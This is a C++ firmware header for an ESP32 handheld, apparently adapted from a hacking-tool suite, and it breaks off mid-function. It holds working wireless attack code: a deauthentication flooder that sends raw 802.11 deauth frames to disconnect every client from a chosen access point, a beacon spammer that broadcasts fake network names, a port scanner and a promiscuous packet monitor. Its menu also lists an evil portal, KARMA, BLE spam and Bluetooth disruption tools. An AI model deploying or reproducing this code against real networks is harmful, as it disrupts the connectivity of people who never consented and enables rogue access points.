// ═══════════════════════════════════════════════════════════
// COMPANION OS v7.0 — DR. HACK MODE (ESP32 ONLY)
// Full hacking suite with 7 sub-tools adapted for 128×160.
// Source: ESP32-TOOLS-PRO by pepeangell5, adapted for CompanionOS.
// ═══════════════════════════════════════════════════════════
#ifndef PAGE_DR_HACK_H
#define PAGE_DR_HACK_H

#ifdef ESP32

#include "globals.h"
#include "ui_components.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <RF24.h>

// DR. HACK TOOL MODULES
#include "dh_wifi_tools.h"
#include "dh_evil_portal.h"
#include "dh_ble_tools.h"
#include "dh_radio_tools.h"
#include "dh_ir_tools.h"
#include "dh_cc1101_tools.h"
#include "dh_web_dashboard.h"

// ═══════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════

DrHackSubState dhCurrentState = DH_MENU;
int dhCursorIndex = 0;
int dhMenuPage = 0;

// Page titles
static const char* DH_PAGE_TITLES[DH_MENU_PAGES] = {
  "WiFi", "WiFi+BLE"
};

// Tool names per page (8 per page × 2 pages)
static const char* DH_TOOL_NAMES[DH_TOTAL_TOOLS] = {
  // Page 1: WiFi
  "WiFi Scan", "CH Scan", "WiFi Radar", "Direction",
  "Beacon", "Deauth", "Evil Portal", "Probe Sniff",
  // Page 2: WiFi+ & BLE
  "KARMA", "WiFi Config", "BLE Scan", "BLE Inspect",
  "BLE Spam", "BT Disrupt", "NRF Test", "Web Dash"
};

static const uint16_t DH_TOOL_COLORS[DH_TOTAL_TOOLS] = {
  // Page 1
  CLR_PRIMARY, CLR_PRIMARY, CLR_PRIMARY, CLR_PRIMARY,
  CLR_SECONDARY, CLR_SECONDARY, CLR_SECONDARY, CLR_SUCCESS,
  // Page 2
  CLR_SECONDARY, CLR_PRIMARY, 0x051F, 0x051F,
  CLR_SECONDARY, CLR_SECONDARY, CLR_TEXT_MED, CLR_PRIMARY
};

// ═══════════════════════════════════════════════════════════
// ENTRY ANIMATION — Red scanline sweep
// ═══════════════════════════════════════════════════════════

static void dhEntryScanline() {
  for (int y = 0; y < SCR_H; y += 2) {
    tft.drawFastHLine(0, y, SCR_W, CLR_SECONDARY);
    delay(5);
    tft.drawFastHLine(0, y, SCR_W, CLR_BG);
  }
}

static void dhExitScanline() {
  for (int y = SCR_H - 1; y >= 0; y -= 2) {
    tft.drawFastHLine(0, y, SCR_W, CLR_SUCCESS);
    delay(3);
    tft.drawFastHLine(0, y, SCR_W, CLR_BG);
  }
}

// ═══════════════════════════════════════════════════════════
// EYES PAGE — Dr. Hack Entry Tile (glowing skull)
// ═══════════════════════════════════════════════════════════

void drawDrHackTile() {
  // Only draw once per eyes page entry — no constant pulsing animation
  static bool dhTileDrawn = false;
  static AppState lastState = STATE_COUNT;
  
  // Reset when entering eyes page fresh
  if (currentState != lastState) {
    dhTileDrawn = false;
    lastState = currentState;
  }
  if (dhTileDrawn) return;
  
  // Bottom-right corner — ultra-subtle indicator (no red, no distraction)
  int tx = SCR_W - SCALE_X(18);
  int ty = SCR_H - SCALE_Y(14);
  int tw = SCALE_X(15);
  int th = SCALE_Y(10);

  // Nearly invisible dark tile (blends with background)
  tft.fillRoundRect(tx, ty, tw, th, 2, CLR_SURFACE);
  tft.drawRoundRect(tx, ty, tw, th, 2, CLR_BORDER);

  // Dim "H" label only (no red skull dot)
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawCentreString("H", tx + tw / 2, ty + 1, 1);
  
  dhTileDrawn = true;
}


// ═══════════════════════════════════════════════════════════
// MAIN MENU — 2×4 Grid of Tool Tiles (128×160)
// ═══════════════════════════════════════════════════════════

static void dhDrawMenu() {
  tft.fillScreen(CLR_BG);

  // Header bar: red gradient, "DR.HACK" + page indicator
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("DR.HACK", SCALE_X(4), SCALE_Y(2), 1);

  // Page indicator: "1/6 WiFi"
  char pgBuf[20];
  sprintf(pgBuf, "%d/%d %s", dhMenuPage + 1, DH_MENU_PAGES, DH_PAGE_TITLES[dhMenuPage]);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawString(pgBuf, SCR_W - SCALE_X(54), SCALE_Y(2), 1);

  // Tool grid: 2 columns × 4 rows
  int gridX = SCALE_X(4);
  int gridY = SCALE_Y(18);
  int tileW = SCALE_X(58);
  int tileH = SCALE_Y(24);
  int gapX = SCALE_X(4);
  int gapY = SCALE_Y(2);

  int pageStart = dhMenuPage * DH_TOOLS_PER_PAGE;

  for (int i = 0; i < DH_TOOLS_PER_PAGE; i++) {
    int globalIdx = pageStart + i;
    if (globalIdx >= DH_TOTAL_TOOLS) break;

    int col = i % 2;
    int row = i / 2;
    int x = gridX + col * (tileW + gapX);
    int y = gridY + row * (tileH + gapY);

    bool selected = (i == dhCursorIndex);

    if (selected) {
      tft.drawRoundRect(x - 1, y - 1, tileW + 2, tileH + 2, 3, CLR_SECONDARY);
      tft.fillRoundRect(x, y, tileW, tileH, 3, darkenColor(CLR_SECONDARY, 70));
    } else {
      tft.fillRoundRect(x, y, tileW, tileH, 3, CLR_SURFACE);
      tft.drawRoundRect(x, y, tileW, tileH, 3, CLR_BORDER);
    }

    // Tool color dot
    tft.fillCircle(x + SCALE_X(6), y + SCALE_Y(6), 2, DH_TOOL_COLORS[globalIdx]);

    // Tool name
    tft.setTextColor(selected ? CLR_TEXT_HI : CLR_TEXT_MED);
    tft.drawString(DH_TOOL_NAMES[globalIdx], x + SCALE_X(12), y + SCALE_Y(4), 1);

    // Tool index
    char idxBuf[4]; sprintf(idxBuf, "%d", globalIdx + 1);
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString(idxBuf, x + SCALE_X(12), y + SCALE_Y(14), 1);
  }

  // Page navigation arrows + exit
  int footY = SCR_H - SCALE_Y(12);
  tft.setTextColor(CLR_TEXT_LO);
  if (dhMenuPage > 0) tft.drawString("<", SCALE_X(4), footY, 1);
  if (dhMenuPage < DH_MENU_PAGES - 1) tft.drawString(">", SCR_W - SCALE_X(10), footY, 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawCentreString("HOLD:Exit", SCR_CX, footY, 1);
}

// ═══════════════════════════════════════════════════════════
// TOOL: WiFi Scanner
// Adapted from hack update files WifiScanner.cpp
// ═══════════════════════════════════════════════════════════

#define DH_MAX_NETWORKS 20
#define DH_VISIBLE_LINES 5

struct DH_NetInfo {
  String ssid;
  int channel;
  int rssi;
  String bssid;
  uint8_t authType;
};

static DH_NetInfo dhNetworks[DH_MAX_NETWORKS];
static int dhNetCount = 0;
static int dhNetCursor = 0;
static int dhNetScroll = 0;

static String dhAuthStr(uint8_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN:            return "OP";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "W1";
    case WIFI_AUTH_WPA2_PSK:
    case WIFI_AUTH_WPA_WPA2_PSK:    return "W2";
    case WIFI_AUTH_WPA3_PSK:
    case WIFI_AUTH_WPA2_WPA3_PSK:   return "W3";
    default:                        return "?";
  }
}

static uint16_t dhAuthColor(uint8_t type) {
  switch (type) {
    case WIFI_AUTH_OPEN:            return CLR_SECONDARY;
    case WIFI_AUTH_WEP:             return 0xFD20;  // orange
    case WIFI_AUTH_WPA_PSK:         return CLR_WARNING;
    case WIFI_AUTH_WPA2_PSK:
    case WIFI_AUTH_WPA_WPA2_PSK:    return CLR_SUCCESS;
    case WIFI_AUTH_WPA3_PSK:
    case WIFI_AUTH_WPA2_WPA3_PSK:   return CLR_PRIMARY;
    default:                        return CLR_TEXT_MED;
  }
}

static int dhRssiBars(int rssi) {
  if (rssi >= -55) return 4;
  if (rssi >= -67) return 3;
  if (rssi >= -75) return 2;
  if (rssi >= -85) return 1;
  return 0;
}

static void dhDrawSignalBars(int x, int y, int bars) {
  uint16_t col = bars >= 3 ? CLR_SUCCESS : (bars >= 2 ? CLR_WARNING : CLR_SECONDARY);
  for (int i = 0; i < 4; i++) {
    int bh = 2 + i * 2;
    int bx = x + i * 4;
    int by = y + (8 - bh);
    if (i < bars) tft.fillRect(bx, by, 3, bh, col);
    else tft.drawRect(bx, by, 3, bh, CLR_BORDER);
  }
}

static void dhDrawNetList() {
  tft.fillScreen(CLR_BG);

  // Header
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_PRIMARY, darkenColor(CLR_PRIMARY, 50), 0);
  tft.setTextColor(CLR_TEXT_HI);
  char hdr[24];
  sprintf(hdr, "WiFi [%d]", dhNetCount);
  tft.drawString(hdr, SCALE_X(4), SCALE_Y(2), 1);

  if (dhNetCount == 0) {
    tft.setTextColor(CLR_WARNING);
    tft.drawCentreString("No networks", SCR_CX, SCR_CY, 1);
    return;
  }

  int listY = SCALE_Y(18);
  int rowH = SCALE_Y(24);

  for (int i = 0; i < DH_VISIBLE_LINES; i++) {
    int idx = i + dhNetScroll;
    if (idx >= dhNetCount) break;

    int y = listY + i * rowH;
    bool sel = (idx == dhNetCursor);
    DH_NetInfo& net = dhNetworks[idx];

    if (sel) {
      tft.fillRect(0, y, SCR_W, rowH - 1, CLR_SURFACE_2);
      tft.drawRect(0, y, SCR_W, rowH - 1, CLR_SECONDARY);
    }

    // Signal bars
    dhDrawSignalBars(SCALE_X(2), y + SCALE_Y(4), dhRssiBars(net.rssi));

    // SSID (truncated)
    String ssid = net.ssid.length() > 0 ? net.ssid : "<HIDDEN>";
    tft.setTextColor(net.ssid.length() == 0 ? CLR_SECONDARY : (sel ? CLR_TEXT_HI : CLR_TEXT_MED));
    drawTruncatedText(SCALE_X(20), y + SCALE_Y(2), ssid.c_str(), SCALE_X(100), 
                      net.ssid.length() == 0 ? CLR_SECONDARY : (sel ? CLR_TEXT_HI : CLR_TEXT_MED), 1);

    // Encryption tag
    tft.setTextColor(dhAuthColor(net.authType));
    tft.drawString(dhAuthStr(net.authType).c_str(), SCR_W - SCALE_X(24), y + SCALE_Y(2), 1);

    // Channel + RSSI on second line
    char meta[20];
    sprintf(meta, "CH%d %ddBm", net.channel, net.rssi);
    tft.setTextColor(CLR_TEXT_LO);
    tft.drawString(meta, SCALE_X(20), y + SCALE_Y(12), 1);
  }

  // Footer
  drawSeparator(0, SCR_H - SCALE_Y(12), SCR_W, CLR_BORDER);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("<:Scrl >:Scrl O:Back", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
}

static void dhRunWifiScan() {
  tft.fillScreen(CLR_BG);
  tft.setTextColor(CLR_PRIMARY);
  tft.drawCentreString("Scanning WiFi...", SCR_CX, SCR_CY - 10, 1);

  // Progress bar
  int barX = SCALE_X(10), barY = SCR_CY + 10, barW = SCR_W - SCALE_X(20), barH = SCALE_Y(8);
  tft.drawRect(barX, barY, barW, barH, CLR_BORDER);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks(false, true);  // sync, show hidden
  if (n < 0) n = 0;
  if (n > DH_MAX_NETWORKS) n = DH_MAX_NETWORKS;

  // Fill progress
  tft.fillRect(barX + 1, barY + 1, barW - 2, barH - 2, CLR_PRIMARY);

  for (int i = 0; i < n; i++) {
    dhNetworks[i].ssid = WiFi.SSID(i);
    dhNetworks[i].channel = WiFi.channel(i);
    dhNetworks[i].rssi = WiFi.RSSI(i);
    dhNetworks[i].bssid = WiFi.BSSIDstr(i);
    dhNetworks[i].authType = WiFi.encryptionType(i);
  }
  WiFi.scanDelete();
  dhNetCount = n;

  // Sort by RSSI desc
  for (int i = 0; i < n - 1; i++) {
    for (int j = 0; j < n - 1 - i; j++) {
      if (dhNetworks[j].rssi < dhNetworks[j + 1].rssi) {
        DH_NetInfo tmp = dhNetworks[j];
        dhNetworks[j] = dhNetworks[j + 1];
        dhNetworks[j + 1] = tmp;
      }
    }
  }

  dhNetCursor = 0;
  dhNetScroll = 0;
  dhDrawNetList();
}

// ═══════════════════════════════════════════════════════════
// TOOL: Port Scanner
// TCP connect scan on common ports
// ═══════════════════════════════════════════════════════════

#define DH_PORT_COUNT 12
static const uint16_t DH_COMMON_PORTS[DH_PORT_COUNT] = {
  21, 22, 23, 25, 53, 80, 443, 445, 3389, 5900, 8080, 8888
};
static const char* DH_PORT_NAMES[DH_PORT_COUNT] = {
  "FTP", "SSH", "Telnet", "SMTP", "DNS", "HTTP", "HTTPS", "SMB",
  "RDP", "VNC", "Alt-HTTP", "UDP-RX"
};

static void dhRunPortScan() {
  // Scan the PC IP
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_WARNING, darkenColor(CLR_WARNING, 40), 0);
  tft.setTextColor(CLR_BG);
  tft.drawString("PORT SCAN", SCALE_X(4), SCALE_Y(2), 1);

  tft.setTextColor(CLR_TEXT_MED);
  extern String pcIPStr;
  String target = pcIPStr;
  tft.drawString(("Target: " + target).c_str(), SCALE_X(4), SCALE_Y(18), 1);

  int listY = SCALE_Y(32);
  int rowH = SCALE_Y(10);

  for (int i = 0; i < DH_PORT_COUNT; i++) {
    int y = listY + i * rowH;
    tft.setTextColor(CLR_TEXT_LO);
    
    char label[16];
    sprintf(label, "%d %s", DH_COMMON_PORTS[i], DH_PORT_NAMES[i]);
    tft.drawString(label, SCALE_X(4), y, 1);

    // 🟠 CRIT-07 FIX: 300ms timeout per port + yield() to
    // prevent WDT reset and 30s+ UI freeze.
    WiFiClient client;
    client.setTimeout(300);  // 300ms max per port
    bool open = client.connect(target.c_str(), DH_COMMON_PORTS[i]);
    client.stop();
    yield();  // Feed the watchdog timer

    if (open) {
      tft.setTextColor(CLR_SUCCESS);
      tft.drawString("OPEN", SCR_W - SCALE_X(28), y, 1);
    } else {
      tft.setTextColor(CLR_SECONDARY);
      tft.drawString("CLOSED", SCR_W - SCALE_X(36), y, 1);
    }

    // Update progress bar
    int progW = ((i + 1) * (SCR_W - SCALE_X(8))) / DH_PORT_COUNT;
    tft.fillRect(SCALE_X(4), SCALE_Y(28), progW, SCALE_Y(3), CLR_WARNING);
  }

  // Footer
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawString("SELECT: back", SCALE_X(4), SCR_H - SCALE_Y(10), 1);
}

// ═══════════════════════════════════════════════════════════
// TOOL: Beacon Spam
// Adapted from BeaconSpam.cpp — fake AP broadcast
// ═══════════════════════════════════════════════════════════

// ESP32 Core 3.x defines this internally in libnet80211.a
// extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) {
//   return 0;  // bypass validation for raw frame TX
// }


static const char* DH_SPAM_SSIDS[] = {
  "Free WiFi Here", "FBI Surveillance Van",
  "Virus.exe", "Not Your WiFi", "Loading...",
  "Password is 1234", "Pretty Fly for a WiFi",
  "Get Off My LAN", "Drop It Like Its Hotspot",
  "Hack Me If You Can", "Router? I Hardly Know Her",
  "WiFi Not Found", "Click Here Free BTC",
  "CompanionOS Rules", "404 Network Unavailable",
  "NSA Listening Post", "Definitely Not A Trap",
  "Your WiFi Is Slow", "Hidden Network lol",
  "Connecting..."
};
static const int DH_SPAM_COUNT = sizeof(DH_SPAM_SSIDS) / sizeof(char*);

static uint8_t dhBeaconFrame[200] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x01, 0x04, 0x00, 0x00
};

static const uint8_t DH_BEACON_TAIL[] = {
  0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
  0x03, 0x01, 0x00
};

static volatile unsigned long dhBeaconsSent = 0;

static void dhSendBeacon(const char* ssid, int channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;
  
  for (int i = 0; i < 6; i++) {
    dhBeaconFrame[10 + i] = (uint8_t)random(0, 256);
    dhBeaconFrame[16 + i] = dhBeaconFrame[10 + i];
  }
  dhBeaconFrame[10] &= 0xFE;
  
  dhBeaconFrame[37] = (uint8_t)ssidLen;
  memcpy(&dhBeaconFrame[38], ssid, ssidLen);
  
  int tailOff = 38 + ssidLen;
  memcpy(&dhBeaconFrame[tailOff], DH_BEACON_TAIL, sizeof(DH_BEACON_TAIL));
  dhBeaconFrame[tailOff + sizeof(DH_BEACON_TAIL) - 1] = (uint8_t)channel;
  
  esp_wifi_80211_tx(WIFI_IF_STA, dhBeaconFrame, tailOff + sizeof(DH_BEACON_TAIL), false);
  dhBeaconsSent++;
}

void dhRunBeaconSpam() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SECONDARY, darkenColor(CLR_SECONDARY, 40), 0);
  tft.setTextColor(CLR_TEXT_HI);
  tft.drawString("BEACON SPAM", SCALE_X(4), SCALE_Y(2), 1);

  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("Broadcasting", SCR_CX, SCALE_Y(20), 1);
  tft.setTextColor(CLR_TEXT_LO);
  tft.drawCentreString("HOLD SELECT to stop", SCR_CX, SCR_H - SCALE_Y(12), 1);

  btStop(); // Disable Bluetooth to prevent RF coexistence panics
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  dhBeaconsSent = 0;
  int ssidIdx = 0;
  int channelIdx = 0;
  const int channels[] = {1, 6, 11};
  unsigned long lastDraw = 0;
  unsigned long lastHop = 0;
  unsigned long holdStart = 0;
  bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    // Send beacon
    dhSendBeacon(DH_SPAM_SSIDS[ssidIdx], channels[channelIdx]);
    ssidIdx = (ssidIdx + 1) % DH_SPAM_COUNT;

    // Channel hop every 500ms
    if (millis() - lastHop > 500) {
      channelIdx = (channelIdx + 1) % 3;
      esp_wifi_set_channel(channels[channelIdx], WIFI_SECOND_CHAN_NONE);
      lastHop = millis();
    }

    // Update display every 300ms
    if (millis() - lastDraw > 300) {
      tft.fillRect(SCALE_X(4), SCALE_Y(40), SCR_W - SCALE_X(8), SCALE_Y(60), CLR_BG);
      
      char buf[32];
      sprintf(buf, "Sent: %lu", dhBeaconsSent);
      tft.setTextColor(CLR_SUCCESS);
      tft.drawString(buf, SCALE_X(4), SCALE_Y(40), 1);

      sprintf(buf, "CH: %d", channels[channelIdx]);
      tft.setTextColor(CLR_PRIMARY);
      tft.drawString(buf, SCALE_X(4), SCALE_Y(55), 1);

      tft.setTextColor(CLR_TEXT_MED);
      drawTruncatedText(SCALE_X(4), SCALE_Y(70), DH_SPAM_SSIDS[ssidIdx], SCR_W - SCALE_X(8), CLR_TEXT_MED, 1);

      // Activity bar
      int barW = random(20, SCR_W - SCALE_X(8));
      tft.fillRect(SCALE_X(4), SCALE_Y(90), SCR_W - SCALE_X(8), SCALE_Y(4), CLR_SURFACE);
      tft.fillRect(SCALE_X(4), SCALE_Y(90), barW, SCALE_Y(4), CLR_SECONDARY);

      lastDraw = millis();
    }

    // Detect SELECT long hold to stop
    #ifdef ESP32
    extern void handleButtons(); handleButtons();
    extern ButtonState btnSelect;
    extern bool consumeLong(ButtonState&);
    if (consumeLong(btnSelect) || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) {
      break;
    }
    #else
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else {
      holding = false;
    }
    #endif

    yield();
    delay(5);
  }

  esp_wifi_set_promiscuous(false);
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: Deauth
// Adapted from Deauther.cpp — 802.11 deauth frames
// ═══════════════════════════════════════════════════════════

static uint8_t dhDeauthFrame[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

static volatile unsigned long dhDeauthPkts = 0;

static void dhSendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
  memcpy(&dhDeauthFrame[4], target, 6);
  memcpy(&dhDeauthFrame[10], bssid, 6);
  memcpy(&dhDeauthFrame[16], bssid, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, dhDeauthFrame, sizeof(dhDeauthFrame), false);
  dhDeauthPkts++;
}

void dhRunDeauth() {
  // First scan for APs
  dhRunWifiScan();
  if (dhNetCount == 0) return;

  // Show disclaimer
  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("DEAUTH WARNING", SCR_CX, 15, 1);
  tft.setTextColor(CLR_TEXT_MED);
  tft.drawCentreString("Only use on YOUR", SCR_CX, 40, 1);
  tft.drawCentreString("own network!", SCR_CX, 55, 1);
  tft.setTextColor(CLR_WARNING);
  tft.drawCentreString("SEL:Accept <:Cancel", SCR_CX, SCR_H - 15, 1);

  // Wait for accept or cancel
  while (true) {
    extern void handleNetwork(); handleNetwork();
    #ifdef ESP32
    extern void handleButtons(); handleButtons();
    extern ButtonState btnSelect, btnLeft;
    extern bool consumePress(ButtonState&);
    if (consumePress(btnSelect) || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) { delay(200); break; }
    if (consumePress(btnLeft) || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false)) { delay(200); return; }
    #else
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) { delay(200); return; }
    #endif
    delay(20);
  }

  // Use first (strongest) AP
  DH_NetInfo& ap = dhNetworks[dhNetCursor];
  uint8_t bssid[6];
  sscanf(ap.bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]);

  // Setup promiscuous mode
  btStop(); // Disable Bluetooth
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);

  tft.fillScreen(CLR_BG);
  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
  tft.setTextColor(CLR_SECONDARY);
  tft.drawCentreString("DEAUTHING", SCR_CX, 10, 1);
  
  tft.setTextColor(CLR_TEXT_MED);
  drawTruncatedText(10, 30, ap.ssid.c_str(), SCR_W - 20, CLR_TEXT_MED, 1);

  dhDeauthPkts = 0;
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  unsigned long lastDraw = 0;
  unsigned long holdStart = 0;
  bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    // Send deauth frames in burst
    for (int i = 0; i < 10; i++) {
      dhSendDeauth(broadcast, bssid);
      delay(1);
    }

    if (millis() - lastDraw > 500) {
      char buf[32];
      sprintf(buf, "Pkts: %lu", dhDeauthPkts);
      tft.fillRect(10, 50, SCR_W - 20, 20, CLR_BG);
      tft.setTextColor(CLR_SUCCESS);
      tft.drawString(buf, 10, 50, 1);

      // Activity indicator
      int barW = random(10, SCR_W - 20);
      tft.fillRect(10, 80, SCR_W - 20, 4, CLR_SURFACE);
      tft.fillRect(10, 80, barW, 4, CLR_SECONDARY);

      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString("HOLD SEL: stop", 10, SCR_H - 12, 1);
      lastDraw = millis();
    }

    #ifdef ESP32
    extern void handleButtons(); handleButtons();
    extern ButtonState btnSelect;
    extern bool consumeLong(ButtonState&);
    if (consumeLong(btnSelect) || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) {
      break;
    }
    #else
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }
    #endif

    yield();
  }

  esp_wifi_set_promiscuous(false);
  delay(100);
}

// ═══════════════════════════════════════════════════════════
// TOOL: Packet Monitor
// Adapted from PacketMonitor.cpp — promiscuous mode PPS
// ═══════════════════════════════════════════════════════════

static volatile unsigned long dhPktCount = 0;

static void dhPktCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  dhPktCount++;
}

void dhRunPacketMonitor() {
  tft.fillScreen(CLR_BG);
  drawGradientCard(0, 0, SCR_W, SCALE_Y(14), CLR_SUCCESS, darkenColor(CLR_SUCCESS, 40), 0);
  tft.setTextColor(CLR_BG);
  tft.drawString("PKT MONITOR", SCALE_X(4), SCALE_Y(2), 1);

  btStop();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&dhPktCallback);
  int ch = 1;
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  dhPktCount = 0;
  unsigned long lastSec = millis();
  int currentPps = 0;
  int peakPps = 0;
  unsigned long totalEver = 0;

  // History buffer for chart
  #define DH_PKT_HISTORY 40
  int history[DH_PKT_HISTORY];
  memset(history, 0, sizeof(history));
  int histIdx = 0;

  unsigned long holdStart = 0;
  bool holding = false;

  while (true) {
    extern void handleNetwork(); handleNetwork();
    // Every second: capture PPS
    if (millis() - lastSec >= 1000) {
      currentPps = dhPktCount;
      dhPktCount = 0;
      totalEver += currentPps;
      if (currentPps > peakPps) peakPps = currentPps;
      history[histIdx] = currentPps;
      histIdx = (histIdx + 1) % DH_PKT_HISTORY;
      lastSec = millis();

      // Redraw
      tft.fillRect(0, SCALE_Y(16), SCR_W, SCR_H - SCALE_Y(28), CLR_BG);

      // Big PPS number
      char buf[16];
      sprintf(buf, "%d", currentPps);
      uint16_t ppsCol = currentPps < 25 ? CLR_PRIMARY : (currentPps < 150 ? CLR_WARNING : CLR_SECONDARY);
      tft.setTextColor(ppsCol);
      tft.drawCentreString(buf, SCR_CX, SCALE_Y(20), 4);

      tft.setTextColor(CLR_TEXT_LO);
      tft.drawCentreString("pkt/s", SCR_CX, SCALE_Y(48), 1);

      // Stats
      sprintf(buf, "CH:%d", ch);
      tft.setTextColor(CLR_PRIMARY);
      tft.drawString(buf, SCALE_X(4), SCALE_Y(60), 1);

      sprintf(buf, "Peak:%d", peakPps);
      tft.setTextColor(CLR_WARNING);
      tft.drawString(buf, SCALE_X(4), SCALE_Y(72), 1);

      sprintf(buf, "Tot:%lu", totalEver);
      tft.setTextColor(CLR_TEXT_MED);
      tft.drawString(buf, SCALE_X(4), SCALE_Y(84), 1);

      // History chart
      int chartY = SCALE_Y(100);
      int chartH = SCALE_Y(40);
      tft.drawRect(SCALE_X(4), chartY, SCR_W - SCALE_X(8), chartH, CLR_BORDER);

      int maxPps = max(peakPps, 10);
      for (int i = 0; i < DH_PKT_HISTORY; i++) {
        int idx = (histIdx + i) % DH_PKT_HISTORY;
        if (history[idx] == 0) continue;
        int barH = (history[idx] * (chartH - 4)) / maxPps;
        if (barH < 1) barH = 1;
        int bx = SCALE_X(6) + (i * (SCR_W - SCALE_X(12))) / DH_PKT_HISTORY;
        uint16_t col = history[idx] < 25 ? CLR_SUCCESS : (history[idx] < 150 ? CLR_WARNING : CLR_SECONDARY);
        tft.drawFastVLine(bx, chartY + chartH - 2 - barH, barH, col);
      }

      // Footer
      tft.setTextColor(CLR_TEXT_LO);
      tft.drawString("</>:CH SEL:back", SCALE_X(2), SCR_H - SCALE_Y(10), 1);
    }

    // Button: change channel
    if ((digitalRead(BTN_LEFT) == LOW || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
      if (ch > 1) { ch--; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
      delay(200);
    }
    if (digitalRead(BTN_RIGHT) == LOW) {
      if (ch < 13) { ch++; esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE); }
      delay(200);
    }

    // Exit on SELECT hold
    #ifdef ESP32
    extern void handleButtons(); handleButtons();
    extern ButtonState btnSelect;
    extern bool consumeLong(ButtonState&);
    if (consumeLong(btnSelect) || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false)) {
      break;
    }
    #else
    if ((digitalRead(BTN_SELECT) == LOW || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
      if (!holding) { holdStart = millis(); holding = true; }
      if (millis() - holdStart > 800) break;
    } else { holding = false; }
    #endif

    delay(10);
  }

  esp_wifi_set_promiscuous(false);
}

// ═══════════════════════════════════════════════════════════
// TOOL: BLE Scanner
// Adapted from BLEDeviceRadar.cpp — BLE device discovery
// ═══════════════════════════════════════════════════════════

#define DH_BLE_MAX 16
#define DH_BLE_VISIBLE 5

struct DH_BleDevice {
  String name;
  String address;
  int rssi;
  uint16_t companyId;
};

static DH_BleDevice dhBleDevices[DH_BLE_MAX];
static int dhBleCount = 0;
static int dhBleCursor = 0;
static int dhBleScroll = 0;

static String dhCompanyName(uint16_t id) {
  switch (id) {
    case 0x004C: return "Apple";
    case 0x0006: return "Microsoft";
    case 0x0075: return "Samsung";
